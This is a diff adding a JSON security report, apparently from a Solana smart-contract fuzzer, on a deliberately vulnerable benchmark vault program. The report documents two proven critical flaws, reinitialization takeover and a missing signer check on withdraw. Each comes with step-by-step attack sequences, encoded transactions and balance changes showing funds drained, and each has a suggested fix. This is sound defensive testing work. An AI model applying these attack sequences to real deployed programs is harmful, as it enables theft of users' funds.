@@ -1,0 +1,360 @@
+{
+  "version": "fuzzy-report/1",
+  "engine": "fuzzy-engine/0.1.0",
+  "scoreVersion": "fuzzy-score/1",
+  "createdAt": "2026-11-09T17:27:02.834Z",
+  "tier": {
+    "id": "sniff",
+    "name": "Sniff",
+    "credits": 100
+  },
+  "program": {
+    "name": "example_vault",
+    "sha256": "6abeccc8b7783a3d368574f56cdfe3e96e56ea3738ee6247b050ae7b74ba183e",
+    "bytes": 12768,
+    "machine": "bpf",
+    "textBytes": 9792,
+    "sbfInstructions": 1224,
+    "idl": true,
+    "instructions": 3,
+    "file": "example_vault_vulnerable.so",
+    "benchmark": true
+  },
+  "score": {
+    "version": "fuzzy-score/1",
+    "score": 20,
+    "grade": "Broken",
+    "mood": "broken",
+    "depth": 55,
+    "depthParts": {
+      "branchCoverage": 0,
+      "instructionCoverage": 20,
+      "attackClasses": 20,
+      "realState": 5,
+      "effort": 10
+    },
+    "ceiling": 20,
+    "cappedBy": "critical",
+    "proven": 2,
+    "leads": 1
+  },
+  "findings": [
+    {
+      "id": "F1",
+      "class": "reinitialization",
+      "instruction": "initialize",
+      "account": null,
+      "severity": "critical",
+      "title": "Anyone can re-run initialize, take over the account, then withdraw its funds",
+      "summary": "initialize does not check that the account is new. The attacker ran it again on an account the owner had already set up and wrote their own key in as the authority, then called withdraw and took 1 SOL.",
+      "fix": "Refuse to initialize an account that already holds data (check the discriminator, or use Anchor's init constraint).",
+      "steps": [
+        {
+          "ix": "initialize",
+          "args": [],
+          "accounts": [
+            {
+              "name": "vault",
+              "role": "state",
+              "label": "state:vault",
+              "signer": false,
+              "writable": true
+            },
+            {
+              "name": "authority",
+              "role": "actor",
+              "label": "actor:owner",
+              "signer": true,
+              "writable": false
+            }
+          ],
+          "payer": "owner"
+        },
+        {
+          "ix": "initialize",
+          "args": [],
+          "accounts": [
+            {
+              "name": "vault",
+              "role": "state",
+              "label": "state:vault",
+              "signer": false,
+              "writable": true
+            },
+            {
+              "name": "authority",
+              "role": "actor",
+              "label": "actor:attacker",
+              "signer": true,
+              "writable": false
+            }
+          ],
+          "payer": "attacker"
+        },
+        {
+          "ix": "withdraw",
+          "args": [
+            "1000000000"
+          ],
+          "accounts": [
+            {
+              "name": "vault",
+              "role": "state",
+              "label": "state:vault",
+              "signer": false,
+              "writable": true
+            },
+            {
+              "name": "authority",
+              "role": "actor",
+              "label": "actor:attacker",
+              "signer": true,
+              "writable": false
+            },
+            {
+              "name": "recipient",
+              "role": "wallet",
+              "label": "new:loot",
+              "signer": false,
+              "writable": true
+            }
+          ],
+          "payer": "attacker"
+        }
+      ],
+      "attackFrom": 1,
+      "evidence": {
+        "transaction": "ARiCubNQJsGdQlDDTx16KsrdEVEEUSMZJNmfe/LSG0tntfdOCOgCH3bV3CUXzi3uTww+mdcw3TXy1Y7VbR4auACAAQABBOqKZtl84I9L99CyFvDYIhzmDShDpy9s5UcIVlKZMWI1T41G83VI77KZ0wtB3dG5tmt7MKYKxAZlP4SYT89XHvOftmPx7nJieqkZ1TNn/H514K0aP5DN5dqI6Ku5BakqLZ0Sc1JsvGIKVYoOhjU5eSvq/MzIHLz9o0cK35h8zmT3JMVFG1a5xTCX5HoyCv0ySid+9E/Ili4eePBCdTeejDwBAwMBAAIQtxJGnJRtoSIAypo7AAAAAAA=",
+        "computeUnits": 794,
+        "logs": [
+          "Program Ba9KvV1PMnLu37UT9R3XVQ26AYyvQ6kq5j83otRAkkyt invoke [1]",
+          "Program Ba9KvV1PMnLu37UT9R3XVQ26AYyvQ6kq5j83otRAkkyt consumed 794 of 200000 compute units",
+          "Program Ba9KvV1PMnLu37UT9R3XVQ26AYyvQ6kq5j83otRAkkyt success"
+        ],
+        "balances": [
+          {
+            "account": "state:vault",
+            "address": "6MY9xF6qeBP8RmPJV246urjdiHYSMXLyH6kJbRMW7q9c",
+            "before": "5000894080",
+            "after": "4000894080"
+          },
+          {
+            "account": "actor:attacker",
+            "address": "GnYofJpMbptWcFYKt9pMZD2R2zrg9whWQYen9xBLh3Bz",
+            "before": "9999995000",
+            "after": "9999990000"
+          },
+          {
+            "account": "new:loot",
+            "address": "BkT8bWSKw14i18vmjuqGumXX6qvNdCnRa6YCKqVNyGVi",
+            "before": "0",
+            "after": "1000000000"
+          }
+        ],
+        "programId": "Ba9KvV1PMnLu37UT9R3XVQ26AYyvQ6kq5j83otRAkkyt"
+      },
+      "proven": true
+    },
+    {
+      "id": "F2",
+      "class": "missing_signer",
+      "instruction": "withdraw",
+      "account": "authority",
+      "severity": "critical",
+      "title": "Anyone can call withdraw without authority's signature and take funds",
+      "summary": "withdraw never checks that authority signed. The attacker named the authority without their signature and the transaction succeeded, moving 1 SOL to the attacker.",
+      "fix": "Require authority to be a signer (in Anchor, Signer<'info>).",
+      "steps": [
+        {
+          "ix": "initialize",
+          "args": [],
+          "accounts": [
+            {
+              "name": "vault",
+              "role": "state",
+              "label": "state:vault",
+              "signer": false,
+              "writable": true
+            },
+            {
+              "name": "authority",
+              "role": "actor",
+              "label": "actor:owner",
+              "signer": true,
+              "writable": false
+            }
+          ],
+          "payer": "owner"
+        },
+        {
+          "ix": "withdraw",
+          "args": [
+            "1000000000"
+          ],
+          "accounts": [
+            {
+              "name": "vault",
+              "role": "state",
+              "label": "state:vault",
+              "signer": false,
+              "writable": true
+            },
+            {
+              "name": "authority",
+              "role": "actor",
+              "label": "actor:owner",
+              "signer": false,
+              "writable": false
+            },
+            {
+              "name": "recipient",
+              "role": "wallet",
+              "label": "new:loot",
+              "signer": false,
+              "writable": true
+            }
+          ],
+          "payer": "attacker"
+        }
+      ],
+      "attackFrom": 1,
+      "evidence": {
+        "transaction": "AdvYO4hoYF2AOTRtuHNOVw/WH/L+qZ8Hao9TPDbc9OMh13lcjJ9K6SRAUnL62J+Dm2OMvtxysA60UxVZLl24LgaAAQACBeqKZtl84I9L99CyFvDYIhzmDShDpy9s5UcIVlKZMWI1T41G83VI77KZ0wtB3dG5tmt7MKYKxAZlP4SYT89XHvOftmPx7nJieqkZ1TNn/H514K0aP5DN5dqI6Ku5BakqLZ0Sc1JsvGIKVYoOhjU5eSvq/MzIHLz9o0cK35h8zmT3q41TqsavOGFmzDK4fIzJMBU1oNdNyR432ZIOhpYW4o8ypyqAQ/TOXJYplK4TfTUKC/8wMulxnikjY4y8ar/MnwEDAwEEAhC3EkaclG2hIgDKmjsAAAAAAA==",
+        "computeUnits": 796,
+        "logs": [
+          "Program Ba9KvV1PMnLu37UT9R3XVQ26AYyvQ6kq5j83otRAkkyt invoke [1]",
+          "Program Ba9KvV1PMnLu37UT9R3XVQ26AYyvQ6kq5j83otRAkkyt consumed 796 of 200000 compute units",
+          "Program Ba9KvV1PMnLu37UT9R3XVQ26AYyvQ6kq5j83otRAkkyt success"
+        ],
+        "balances": [
+          {
+            "account": "state:vault",
+            "address": "6MY9xF6qeBP8RmPJV246urjdiHYSMXLyH6kJbRMW7q9c",
+            "before": "5000894080",
+            "after": "4000894080"
+          },
+          {
+            "account": "actor:owner",
+            "address": "CYfhybCHMsRoAh61JkBXz7bZkF8jLtWJvZSxStxeEtia",
+            "before": "9999995000",
+            "after": "9999995000"
+          },
+          {
+            "account": "new:loot",
+            "address": "BkT8bWSKw14i18vmjuqGumXX6qvNdCnRa6YCKqVNyGVi",
+            "before": "0",
+            "after": "1000000000"
+          },
+          {
+            "account": "actor:attacker",
+            "address": "GnYofJpMbptWcFYKt9pMZD2R2zrg9whWQYen9xBLh3Bz",
+            "before": "10000000000",
+            "after": "9999995000"
+          }
+        ],
+        "programId": "Ba9KvV1PMnLu37UT9R3XVQ26AYyvQ6kq5j83otRAkkyt"
+      },
+      "proven": true
+    }
+  ],
+  "leads": [
+    {
+      "class": "missing_owner",
+      "instruction": "ping",
+      "title": "ping accepts a fake vault",
+      "detail": "It accepted an account the program does not own, but changed nothing, so it is not counted."
+    }
+  ],
+  "tested": {
+    "durationMs": 828,
+    "transactions": 185,
+    "paths": 11,
+    "instructions": [
+      {
+        "name": "initialize",
+        "succeeded": true,
+        "failed": true
+      },
+      {
+        "name": "withdraw",
+        "succeeded": true,
+        "failed": true
+      },
+      {
+        "name": "ping",
+        "succeeded": true,
+        "failed": true
+      }
+    ],
+    "classes": [
+      {
+        "id": "missing_signer",
+        "name": "Missing signer check",
+        "status": "broke it"
+      },
+      {
+        "id": "missing_owner",
+        "name": "Missing owner check",
+        "status": "held"
+      },
+      {
+        "id": "account_substitution",
+        "name": "Account substitution",
+        "status": "held"
+      },
+      {
+        "id": "pda_seed",
+        "name": "PDA seed collision",
+        "status": "does not apply"
+      },
+      {
+        "id": "arithmetic",
+        "name": "Arithmetic overflow",
+        "status": "held"
+      },
+      {
+        "id": "close_reuse",
+        "name": "Close, then reuse",
+        "status": "does not apply"
+      },
+      {
+        "id": "unchecked_cpi",
+        "name": "Unchecked CPI target",
+        "status": "does not apply"
+      },
+      {
+        "id": "unchecked_mint",
+        "name": "Unchecked mint or authority",
+        "status": "does not apply"
+      },
+      {
+        "id": "lamport_draining",
+        "name": "Lamport draining",
+        "status": "held"
+      },
+      {
+        "id": "reinitialization",
+        "name": "Reinitialization",
+        "status": "broke it"
+      },
+      {
+        "id": "price_manipulation",
+        "name": "Price manipulation",
+        "status": "does not apply"
+      },
+      {
+        "id": "compute_exhaustion",
+        "name": "Compute exhaustion",
+        "status": "held"
+      }
+    ],
+    "state": "synthetic",
+    "branchCoverage": "not measured in this engine version"
+  },
+  "notes": [
+    "Every finding was reproduced in LiteSVM with the transaction attached. Leads were tried and did not break anything; they never count toward the score.",
+    "Branch coverage is not measured yet, so it adds 0 of 40 to Depth. With synthetic accounts, that caps any score from this engine version at 55.",
+    "Accounts are synthetic, built from the IDL. Cloned mainnet state arrives with Deep Fuzz."
+  ],
+  "seed": "example"
+}
